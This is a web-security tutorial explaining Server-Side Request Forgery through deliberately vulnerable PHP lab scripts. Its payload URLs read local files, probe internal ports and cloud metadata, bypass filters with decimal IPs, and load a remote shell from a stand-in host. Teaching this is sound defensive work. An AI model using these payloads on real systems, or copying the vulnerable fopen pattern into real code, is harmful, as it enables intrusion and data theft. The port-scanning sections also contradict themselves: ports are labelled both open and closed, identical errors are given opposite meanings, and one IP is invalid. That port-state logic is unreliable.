# Server-Side Request Forgery (SSRF)

**Server-Side Request Forgery**
Server-Side Request Forgery (SSRF) is a web security vulnerability where an attacker manipulates a server-side application to make unauthorized HTTP requests to unintended locations, such as internal services or files. This exploits user-supplied URLs or inputs that the server fetches without proper validation, often bypassing firewalls or network restrictions.

Server-Side Request Forgery (SSRF) occurs when attackers trick servers into making unauthorized requests to internal or external resources, bypassing network protections like firewalls.

## SSRF Impacts
Server-Side Request Forgery (SSRF) allows attackers to exploit server-trusted requests, leading to severe consequences like data leaks and system compromise.

### Read Files from Affected Server
Attackers access local files using `file://` schemes, such as `file:///etc/passwd` on Linux or `file:///c:/windows/win.ini` on Windows, exposing credentials or configs. This bypasses direct file access restrictions since requests originate from the trusted server.

### Scan Local or External Networks
SSRF probes ports and services on internal networks via private IPs (e.g., `http://127.0.0.1:22`), mapping infrastructure without direct access. Time-based or DNS interactions reveal live hosts, aiding lateral movement.

### Interact with Internal Systems
Servers fetch data from non-routable back-ends like metadata services (e.g., AWS IMDS), extracting tokens or configs via `http://169.254.169.254`. This exploits trust relationships, enabling unauthorized API calls or database queries.

---

# SSRF Classifications

### Error-Based SSRF
*   Behavior changes based on existence of a resource:
    *   `200 OK` ‚Üí resource exists
    *   `404 / 500` ‚Üí resource does not exist
*   Used for:
    *   Internal path discovery
    *   Port scanning

### Boolean-Based SSRF
*   Script response differs slightly based on:
    *   Content size
    *   Response headers
    *   Output differences
*   Used when errors are suppressed.

### 3. Time-Based SSRF
Useful when output is identical for all responses.

**Example:**
*   Open port returns fast
*   Closed port returns slow
*   Filtered port hangs

**Timing differences help determine:**
*   Open/closed/filtered ports
*   Service behavior

---

# Vulnerable Code Analysis

**File: `ssrf.php`**

    
    <?php
    // SSRF VULNERABILITY: No input validation on $_GET['img_url']
    if (isset($_GET['img_url'])){
    
        $url = $_GET['img_url']; // Direct user input -> SSRF risk
    
        // # VULNERABLE: fopen() fetches ANY URL (http, file://, internal IPs) if allow_url_fopen=On
        $file = fopen($url, 'rb'); // Supports http://, https://, file://, localhost, private IPs
    
        // # Misleading: Always sends image/png header regardless of actual content
        header("Content-Type: image/png"); // CONTENT-BASED SSRF: Response reveals internal data
    
        // # Streams back whatever was fetched - images, HTML, /etc/passwd, phpinfo()
        fpassthru($file); // Attacker sees raw response from internal services
    
    }
    
    // Fallback message when no img_url provided
    echo "Please enter image url";
    ?>


---

# Advanced Exploitation & Trends

### Remote Code Execution (RCE)
*   Chained SSRF triggers RCE by hitting vulnerable internal endpoints or uploading shells via exploited proxies. Recent cases like **CVE-2025-61882** in Oracle EBS demonstrate pre-auth RCE through SSRF plus CRLF injection.

### Common Attack Examples
*   Accessing localhost admin pages: `?page=http://127.0.0.1/admin` to exploit trust in local requests.
*   Loading remote malicious content: `?page=https://malicioussite.com/shell.php`.
*   Bypassing filters with IP variants like `2130706433` (decimal for `127.0.0.1`).

### Recent Trends (2025)
SSRF attacks surged **452%** from 2023 to 2024, fueled by AI automation tools that generate bypass payloads and target cloud metadata services. Coordinated exploits hit multiple CVEs simultaneously across 400+ IPs, often chaining with path traversal for footholds.

### Notable 2025 Vulnerabilities

| CVE | Product | Impact | Disclosure |
| :--- | :--- | :--- | :--- |
| **CVE-2025-61882** | Oracle EBS 12.2.3-12.2.14 | Pre-auth RCE via SSRF + CRLF | Oct 2025 |
| **CVE-2025-20388** | Unspecified | Blind SSRF exposing networks | Dec 2025 |
| **CVE-2025-27888** | Apache Druid <31.0.2/32.0.1 | SSRF via proxy URL parsing | Sep 2025 |
| **CVE-2025-59088** | kdcproxy | SSRF via DNS discovery | Nov 2025 |

### Updated Prevention
Enforce allow lists for URLs, ports, and IPs; block private ranges and localhost variants like `127.1` or `2130706433`. Segment networks, disable HTTP redirects, and use behavioral detection over deny lists, as AI tools bypass signatures. Migrate cloud metadata to IMDSv2 equivalents for session auth.


# SSRF Payload Behavior & Analysis

### How the Payloads Behave

**1. Local image fetch**

    ?img_url=upload/1.png

The PHP script loads a local file from the server directory.

**2. External image fetch**

    ?img_url=https://www.armourinfosec.io/logo.png

Server fetches the image from the internet ‚Üí works normally.

**3. HTTP fetch to a webpage**

    ?img_url=https://www.google.com/


The script expects an image, but receives HTML, which gets output as PNG content type ‚Üí browser shows corrupt image / download.
> **Note:** This is evidence of SSRF functionality.

**4. Internal service discovery**
    
    ?img_url=http://127.0.0.1:80
    ?img_url=http://127.0.0.1:443
    ?img_url=http://192.168.1.6:80


These requests allow:
*   Port scanning
*   Internal service fingerprinting
*   Checking HTTP status differences (`200`/`500`/`404`)

**5. Local file read (LFI via stream wrapper)**
*   *Accessing local files using file wrappers.*

---

### Common SSRF-Prone PHP Functions

These functions create SSRF vectors when fed untrusted input:

| Function | SSRF Risk | Why |
| :--- | :--- | :--- |
| `fopen()` | **High** | Supports multiple wrappers (`http`, `file`, `php`, `ftp`) |
| `fread()` | **Medium** | Reads arbitrary data after `fopen()` |
| `fsockopen()` | **High** | Low-level socket ‚Üí port scanning |
| `curl_exec()` | **High** | Follows redirects, supports most protocols |
| `file_get_contents()` | **High** | Same wrappers as `fopen()` |

---

### Test Setup

**Local Python server for internal service simulation:**

    python3 -m http.server --bind 127.0.0.1 8080

---

### Why is this vulnerable?

`fopen()` accepts any stream wrapper supported by PHP:
*   `http://`
*   `https://`
*   `ftp://`
*   `php://`
*   `file://`

This means the attacker can make the server request:
*   Internal network URLs
*   Local files (e.g., `file:///etc/passwd`)

# Error-Based SSRF & Boolean-Based SSRF
 
        <?php
      // ERROR-BASED SSRF: Errors expose internal service existence
      if (isset($_GET['img_url'])) {
      
          $url = $_GET['img_url'];   // Direct user input -> SSRF risk
      
          // VULNERABLE: fopen() fetches ANY URL if allow_url_fopen=On
          $file = fopen($url, 'rb');   // http://, file://, localhost, private IPs
      
          // ERROR-BASED SSRF: PHP warnings reveal connection failures
          if (!$file) {
              // Connection errors (timeout, refused) indicate port status
              die('Error: Cannot open URL - ' . error_get_last()['message']);
          }
      
          // Always image/png - content type irrelevant for error-based
          header("Content-Type: image/png");
      
          // Only streams if successful - errors show separately
          fpassthru($file);
      
      } else {
          echo 'Please enter image url';
      }
      ?>

# Server-Side Request Forgery (SSRF) Detection Techniques

## 1. Error-Based SSRF Detection
**Principle:** PHP `fopen()` errors differ based on target reachability.

### Port States & Responses
*   **Port 80 (Web Server) ‚Üí Success**
    *   *Result:* Image streams
    ```
    http://192.168.1.31/web-pentest/error-based-ssrf.php?img_url=http://127.0.0.1:80
    ```

*   **Port 22 (SSH, Closed) ‚Üí "Failed to connect"**
    *   *Result:* Error message visible
    ```
    http://192.168.1.31/web-pentest/error-based-ssrf.php?img_url=http://127.0.0.1:22
    ```

*   **Port 3306 (MySQL, Open) ‚Üí Connection refused**
    *   *Result:* Different error message
    ```
    http://192.168.1.31/web-pentest/error-based-ssrf.php?img_url=http://127.0.0.1:3306
    ```

*   **Unreachable Host ‚Üí Timeout**
    *   *Result:* Slow "Connection timed out" response
    ```
    http://192.168.1.31/web-pentest/error-based-ssrf.php?img_url=http://10.0.0.999:80
    ```

### Error Message Analysis
Below are examples of backend errors that reveal internal architecture:


### OPEN PORT (service exists):
      
      Warning: fopen(http://127.0.0.1:22): failed to open stream:
      Connection refused in /var/www/ssrf.php on line 8

### CLOSED PORT (no listener):

      Warning: fopen(http://127.0.0.1:9999): failed to open stream:
      Connection refused in /var/www/ssrf.php on line 8

### TIMEOUT (firewall blocks):

      Warning: fopen(http://10.100.100.100:80): failed to open stream:
      Connection timed out after 5 seconds in /var/www/ssrf.php on line 8

      
### Port Scanning Summary

| Port | Service | Expected Error | Status |
| :--- | :--- | :--- | :--- |
| **80** | HTTP | Success (streams) | ‚úÖ OPEN |
| **22** | SSH | "Connection refused" | ‚úÖ OPEN |
| **3306** | MySQL | "Connection refused" | ‚úÖ OPEN |
| **9999** | None | "Connection refused" | ‚ùå CLOSED |
| **10.0.0.5:80** | Firewall | "Timed out" | üîí BLOCKED |

---

## 2. Boolean-Based SSRF Detection
**Principle:** Fixed response patterns create TRUE/FALSE signals based on data size or status codes.

### Vulnerable Code Example (`boolean-based-ssrf.php`)

      
      <?php
      // BOOLEAN-BASED SSRF: Response length/status reveals internal service existence
      if (isset($_GET['img_url'])) {
      
          $url = $_GET['img_url'];  // Direct user input ‚Üí SSRF risk
      
          // Vulnerable: fopen() fetches ANY URL
          $file = fopen($url, 'rb');
      
          if ($file) {
              // SUCCESS = TRUE (LONG response = internal content size)
              header("Content-Type: image/png");
              fpassthru($file);
              fclose($file);
              exit;   // Clean exit after successful fetch
          } else {
              // FAILURE = FALSE (SHORT fixed response)
              header("Content-Type: text/html");
      
              echo "<h1>Image not found</h1>";  // ALWAYS 25 bytes
      
              exit;
          }
      
      } else {
          echo 'Please enter image url';
      }
      ?>


### Response Fingerprinting
By analyzing the response size (Bytes), we can determine the state of internal services.

*   **Port 80 OPEN ‚Üí SUCCESS**
    *   *Payload:* `GET /boolean-based-ssrf.php?img_url=http://127.0.0.1:80`
    *   *Response:* 2048 bytes of HTML

*   **Port 22 OPEN ‚Üí SUCCESS**
    *   *Payload:* `GET /boolean-based-ssrf.php?img_url=http://127.0.0.1:22`
    *   *Response:* 25 bytes "Image not found" (Empty response handling)

*   **Port 3306 OPEN ‚Üí SUCCESS**
    *   *Payload:* `GET /boolean-based-ssrf.php?img_url=http://127.0.0.1:3306`
    *   *Response:* 512 bytes binary data (MySQL Banner)

### Boolean Logic Table

| Internal Target | Response Size | Boolean Value | Interpretation |
| :--- | :--- | :--- | :--- |
| `127.0.0.1:80` | 2048 bytes | **TRUE** | Web server exists |
| `127.0.0.1:22` | 25 bytes | **FALSE** | No HTTP service |
| `127.0.0.1:3306`| 512 bytes | **TRUE** | MySQL responds |
| `10.0.0.999:80` | 25 bytes | **FALSE** | Host unreachable |
